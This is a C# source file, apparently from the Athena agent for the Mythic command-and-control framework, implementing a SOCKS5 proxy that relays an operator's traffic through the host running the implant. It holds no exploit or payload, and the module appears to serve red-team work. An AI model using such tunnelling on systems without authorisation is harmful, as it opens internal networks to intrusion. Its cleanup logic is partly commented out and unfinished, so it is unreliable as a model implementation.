using Athena.Models.Athena.Socks;
using Athena.Models.Mythic.Response;
using Athena.Utilities;
using Newtonsoft.Json;
using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Linq;
using System.Net.Sockets;
using System.Threading;
using System.Threading.Tasks;

namespace Athena.Commands.Model
{
    public class SocksHandler
    {
        private CancellationTokenSource ct { get; set; }
        private ConcurrentDictionary<int, ConnectionOptions> connections { get; set; }
        private ConcurrentBag<SocksMessage> messagesOut = new ConcurrentBag<SocksMessage>();
        private ConcurrentQueue<SocksMessage> messagesIn = new ConcurrentQueue<SocksMessage>();
        public bool running { get; set; }
        public SocksHandler()
        {
            this.running = false;
            this.connections = new ConcurrentDictionary<int, ConnectionOptions>();
        }

        public bool Start()
        {
            this.ct = new CancellationTokenSource();
            try
            {
                //Read
                Task.Run(() => { ReadMythicMessages(); });
                Task.Run(() => { ReadServerMessages(); });
            }
            catch
            {
                this.Stop();
                return false;
            }
            return true;
        }

        public bool Stop()
        {
            try
            {
                this.running = false;
                this.ct.Cancel();
                return true;
            }
            catch
            {
                return false;
            }
        }

        public List<SocksMessage> getMessages()
        {
            List<SocksMessage> messages = this.messagesOut.ToList();
            //Misc.WriteDebug("Messages Out Queue: " + messagesOut.Count);
            this.messagesOut.Clear();
            messages.Reverse();
            return messages;
        }

        public void AddToQueue(SocksMessage message)
        {
            //Misc.WriteDebug("Message In Queue: " + messagesIn.Count);
            this.messagesIn.Enqueue(message);
        }

        //This function will take messages FROM mythic and forward them to the Server.
        //Client -> Mythic -> Athena -> Server
        private void ReadMythicMessages()
        {
            while (!this.ct.IsCancellationRequested)
            {
                SocksMessage sm;
                while (!messagesIn.TryDequeue(out sm)) { }
                //Misc.WriteDebug(messagesIn.Count().ToString());
                Task.Run(() => { HandleMessage(sm); });
            }
        }

        public int Count()
        {
            return this.messagesOut.Count();
        }
        //This function will send messages from the Server TO mythic.
        //Server -> Athena -> Mythic -> Client
        private void ReadServerMessages()
        {
            while (!this.ct.IsCancellationRequested)
            {
                Parallel.ForEach(this.connections, connection =>
                {
                    try
                    {
                        if (connection.Value.socket.Available > 0)
                        {
                            ReceiveChunk(connection.Value);
                        }

                        if (!connection.Value.socket.Connected)
                        {
                            //Misc.WriteDebug($"{connection.Key} closed socket.");
                            SocksMessage smOut = new SocksMessage()
                            {
                                server_id = connection.Key,
                                data = "",
                                exit = true
                            };

                            //Add to our messages queue.
                            this.messagesOut.Add(smOut);
                        }
                    }
                    catch (ObjectDisposedException)
                    {
                        //ConnectionOptions cn;
                        //while (!this.connections.TryRemove(connection.Key, out cn)) { }
                        //Misc.WriteDebug("Removed Connection.");
                    }
                });
            }
        }

        private void HandleMessage(SocksMessage sm)
        {
            //https://github.com/MythicAgents/poseidon/blob/master/Payload_Type/poseidon/agent_code/socks/socks.go#L314
            //Should I be doing this?


            if (this.connections.ContainsKey(sm.server_id))
            {
                //We already know about this connection, so let's just forward the data.
                try
                {
                    //Convert datagram to byte[]
                    byte[] datagram = Misc.Base64DecodeToByteArray(sm.data);

                    //Check datagram
                    if (datagram.Length > 0)
                    {
                        //Get socket object we created previously
                        Socket s = this.connections[sm.server_id].socket;

                        //Forward datagram to endpoint
                        s.Send(Misc.Base64DecodeToByteArray(sm.data));
                    }
                    else
                    {
                        ////////////////////////////////////////////////////////////////////////////////////////////////
                        ///Removed this for now because it seems to stop accepting new connections when this is called?
                        ////////////////////////////////////////////////////////////////////////////////////////////////

                        //We get an empty datagram for a connection we're currently following.
                        if (sm.exit)
                        {
                            //Misc.WriteDebug("[ServerID] " + sm.server_id + " exit.");
                            //Datagram is an exit packet from Mythic, let's close the connection, dispose of the socket, and remove it from our tracker.
                            //if (this.connections.ContainsKey(sm.server_id))
                            //{
                            //    this.connections[sm.server_id].socket.Disconnect(true);
                            //    this.connections[sm.server_id].socket.Close();
                            //    this.connections.Take(sm.server_id);
                            //}

                            //Remove from our tracker
                            //while (!this.connections.TryRemove(this.connections.Where(kvp => kvp.Value.server_id == sm.server_id).FirstOrDefault())) ;
                            //ConnectionOptions cn;
                            //while (!this.connections.TryRemove(sm.server_id, out cn)) { }
                            //Misc.WriteDebug("Removed Connection.");

                            //No reason really to send a response to Mythic
                        }
                        else
                        {
                            Misc.WriteDebug("[EmptyNonExitPacket] Sent by ID: " + sm.server_id);
                        }
                        //Do I need an else for this? What do we do with empty data packets?
                    }
                }
                catch (SocketException e)
                {
                    //We hit an error, let's figure out what it is.
                    Misc.WriteDebug(e.Message + $"({e.ErrorCode})");
                    //Tell mythic that we've closed the connection and that it's time to close it on the client end.
                    SocksMessage smOut = new SocksMessage()
                    {
                        server_id = sm.server_id,
                        data = "",
                        exit = true
                    };

                    //Add to our messages queue.
                    this.messagesOut.Add(smOut);

                    //Remove connection from our tracker.
                    //while (!this.connections.TryRemove(this.connections.Where(kvp => kvp.Value.server_id == sm.server_id).FirstOrDefault())) ;
                }

            }
            else
            {
                //This is the first time we've seen this server_id
                //Convert datagram to byte[]
                byte[] datagram = Misc.Base64DecodeToByteArray(sm.data);

                //Check if the datagram is empty.
                if (datagram.Length > 0)
                {
                    //Do we even support this datagram?
                    if (datagram[0] != (byte)0x05)
                    {
                        //Protocol Error, do I need to provide actual information to this?
                        ConnectResponse cr = new ConnectResponse()
                        {
                            status = ConnectResponseStatus.ProtocolError,
                            //this need to be localhost
                            bndaddr = new byte[] { 0x7F, 0x00, 0x00, 0x01 },
                            //this needs to be the bind port
                            bndport = new byte[] { 0x50, 0x00 },
                            addrtype = 0x01
                        };


                        //We've received an unsupported version header
                        SocksMessage smOut = new SocksMessage()
                        {
                            server_id = sm.server_id,
                            data = Misc.Base64Encode(cr.ToByte()),
                            exit = true
                        };

                        //Send Response
                        //Globals.bagOut[sm.server_id] = smOut;
                        this.messagesOut.Add(smOut);
                        //Return an unsupported error
                    }
                    else
                    {
                        //We do support this datagram, so let's put together out connection object
                        ConnectionOptions cn = new ConnectionOptions(datagram, sm.server_id);


                        //TODO SUPPORT FOR BINDING AND UDP STREAMS
                        //switch (datagram[1])
                        //{
                        //    case (byte)0x01: //tcp/ip stream
                        //        Misc.WriteDebug("tcp/ip stream");
                        //        break;
                        //    case (byte)0x02: //tcp/ip port bind
                        //        Misc.WriteDebug("tcp/ip bind");
                        //        break;
                        //    case (byte)0x03: //associate udp port
                        //        Misc.WriteDebug("udp port");
                        //        break;
                        //    default:
                        //        Misc.WriteDebug("Unknown");
                        //        break;
                        //}

                        //Did our ConnectionOptions object create properly?
                        if (cn.socket != null && cn.endpoint != null)
                        {
                            try
                            {
                                //Attempt to connect to the endpoint.
                                cn.socket.Connect(cn.endpoint);

                                //If we made it to here, we've succceeded. Let's let mythic know.
                                ConnectResponse cr = new ConnectResponse()
                                {
                                    status = ConnectResponseStatus.Success,
                                    bndaddr = cn.bndBytes,
                                    bndport = cn.bndPortBytes,
                                    addrtype = cn.addressType
                                };

                                //Shove our SOCKS5 message inside of a mythic message.
                                SocksMessage smOut = new SocksMessage()
                                {
                                    server_id = sm.server_id,
                                    data = Misc.Base64Encode(cr.ToByte()),
                                    exit = false
                                };
                                //Add to our message queue
                                this.messagesOut.Add(smOut);

                                //Add the ConnectionsOptions object to our tracker.
                                //Mostly only down here to prevent us from having to worry about removing it if something happened with adding it to the MythicOut queue
                                //while (!this.connections.TryAdd(sm.server_id, cn)) ;
                                this.connections.AddOrUpdate(sm.server_id, cn, (key, oldValue) => cn);
                            }
                            catch (SocketException e)
                            {
                                Misc.WriteDebug(e.Message + $"({e.ErrorCode})");
                                //We failed to connect likely. Why though?
                                ConnectResponse cr = new ConnectResponse()
                                {
                                    //this need to be localhost
                                    bndaddr = new byte[] { 0x00, 0x00, 0x00, 0x00 },
                                    //this needs to be the bind port
                                    bndport = new byte[] { 0x00, 0x00 },
                                    addrtype = 0x00
                                };

                                //Get error reason.
                                switch (e.ErrorCode)
                                {
                                    case 10065: //Host Unreachable
                                        cr.status = ConnectResponseStatus.HostUnreachable;
                                        break;
                                    case 10047: //Address Family Not Supported
                                        cr.status = ConnectResponseStatus.AddressTypeNotSupported;
                                        break;
                                    case 10061: //Connection Refused
                                        cr.status = ConnectResponseStatus.ConnectionRefused;
                                        break;
                                    case 10051: //Network Unreachable
                                        cr.status = ConnectResponseStatus.NetworkUnreachable;
                                        break;
                                    case 10046: //Protocol Family Not Supported
                                        cr.status = ConnectResponseStatus.ProtocolError;
                                        break;
                                    case 10043: //Protocol Not Supported
                                        cr.status = ConnectResponseStatus.ProtocolError;
                                        break;
                                    case 10042: //Protocol Option
                                        cr.status = ConnectResponseStatus.ProtocolError;
                                        break;
                                    case 10041: //Protocol Type
                                        cr.status = ConnectResponseStatus.ProtocolError;
                                        break;
                                    case 10060: //Timeout
                                        cr.status = ConnectResponseStatus.TTLExpired;
                                        break;
                                    default: //Everything else
                                        cr.status = ConnectResponseStatus.GeneralFailure;
                                        break;
                                }

                                //Add to SocksMessage
                                SocksMessage smOut = new SocksMessage()
                                {
                                    server_id = sm.server_id,
                                    data = Misc.Base64Encode(cr.ToByte()),
                                    exit = true
                                };
                                //Put in out queue
                                this.messagesOut.Add(smOut);
                            }
                        }
                        //It did not.
                        else
                        {
                            //Get ready to send socks message indicating reason for CONNECT failure
                            ConnectResponse cr = new ConnectResponse()
                            {
                                //this need to be localhost
                                bndaddr = new byte[] { 0x7F, 0x00, 0x00, 0x01 },
                                //this needs to be the bind port
                                bndport = new byte[] { 0x50, 0x00 },
                                addrtype = 0x01
                            };

                            //Couldn't figure out the address family for the request.
                            if (cn.addressFamily == AddressFamily.Unknown)
                            {
                                Misc.WriteDebug("Address Family not supported.");
                                cr.status = ConnectResponseStatus.AddressTypeNotSupported;
                            }
                            //Endpoint could not be resolved.
                            else if (cn.endpoint is null)
                            {
                                Misc.WriteDebug("Host Unreachable.");
                                cr.status = ConnectResponseStatus.HostUnreachable;
                            }
                            //Something else.
                            else
                            {
                                Misc.WriteDebug("Random Failure.");
                                cr.status = ConnectResponseStatus.GeneralFailure;
                            }

                            //Shove SOCKS CONNECT response into Mythic Response
                            SocksMessage smOut = new SocksMessage()
                            {
                                server_id = sm.server_id,
                                data = Misc.Base64Encode(cr.ToByte()),
                                exit = false
                            };

                            //Add it to queue, and we're outta here!
                            this.messagesOut.Add(smOut);
                        }
                    }
                }
                else
                {
                    Misc.WriteDebug(sm.data);
                    //If we get here, it's both an empty datagram and for a connection we're not currently following.
                }
            }
        }

        private void ReceiveChunk(ConnectionOptions conn)
        {
            SocksMessage smOut;
            byte[] bytes;
            int bytesRec;

            //If you are using a non-blocking Socket, Available is a good way to determine whether data is queued for reading, before calling Receive.
            //The available data is the total amount of data queued in the network buffer for reading. If no data is queued in the network buffer, Available returns 0.
            //https://docs.microsoft.com/en-us/dotnet/api/system.net.sockets.socket.available?view=net-5.0
            while (conn.socket.Available != 0)
            {
                //Let's allocate our bytes, either in 512k chunks or less.
                if (conn.socket.Available < 512000)
                {
                    bytes = new byte[conn.socket.Available];
                }
                else
                {
                    bytes = new byte[512000];
                }
                //Receive our allocation.
                bytesRec = conn.socket.Receive(bytes);

                smOut = new SocksMessage()
                {
                    server_id = conn.server_id,
                    data = Misc.Base64Encode(bytes),
                    exit = false
                };
                this.messagesOut.Add(smOut);
            }

            //https://github.com/MythicAgents/poseidon/blob/master/Payload_Type/poseidon/agent_code/socks/socks.go#L314
            //Should I be doing this?
            smOut = new SocksMessage()
            {
                server_id = conn.server_id,
                data = Misc.Base64Encode(new byte[] { }),
                exit = true
            };
            this.messagesOut.Add(smOut);
        }
       
    }
}
